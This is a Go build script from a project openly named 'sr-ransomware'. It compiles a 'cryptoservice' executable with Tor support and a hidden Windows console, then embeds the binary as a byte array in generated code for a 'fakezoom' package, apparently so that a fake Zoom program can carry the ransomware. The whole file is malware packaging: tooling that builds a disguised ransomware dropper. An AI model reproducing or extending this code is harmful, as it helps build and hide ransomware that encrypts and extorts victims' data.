package main

import (
    "os"
    "fmt"
    "log"
    "bufio"
    "os/exec"
    "io/ioutil"
    "path/filepath"
)

const workdir = "tmp"
var cryptoservicePath = filepath.Join(workdir, "cryptoservice.exe")

func main() {
    log.Println("> Generating github.com/sug0/sr-ransomware/go/main/fakezoom/cryptoservice_buffer.go")
    if _, err := os.Stat("zoom_buffer.go"); err == nil {
        return
    }
    f, err := os.Create("cryptoservice_buffer.go")
    if err != nil {
        log.Fatal(err)
    }
    defer f.Close()
    cryptoservice, err := cryptoserviceBytes()
    if err != nil {
        log.Fatal(err)
    }
    w := bufio.NewWriter(f)
    fmt.Fprintf(w, "package exe;var cryptoserviceEXE=[]byte{")
    for i := 0; i < len(cryptoservice); i++ {
        fmt.Fprintf(w, "%d,", cryptoservice[i])
    }
    fmt.Fprintf(w, "}")
    w.Flush()
}

func cryptoserviceBytes() ([]byte, error) {
    if err := os.Mkdir(workdir, os.ModePerm); err != nil && !os.IsExist(err) {
        return nil, err
    }
    if _, err := os.Stat(cryptoservicePath); err != nil {
        err = buildCryptoservice()
        if err != nil {
            return nil, err
        }
    }
    f, err := os.Open(cryptoservicePath)
    if err != nil {
        return nil, err
    }
    defer f.Close()
    return ioutil.ReadAll(bufio.NewReader(f))
}

func buildCryptoservice() error {
    return exec.Command(
        "go", "build",
        "-tags", "tor",
        "-ldflags", "-H=windowsgui -s -w",
        "-o", cryptoservicePath,
        "github.com/sug0/sr-ransomware/go/main/cryptoservice",
    ).Run()
}
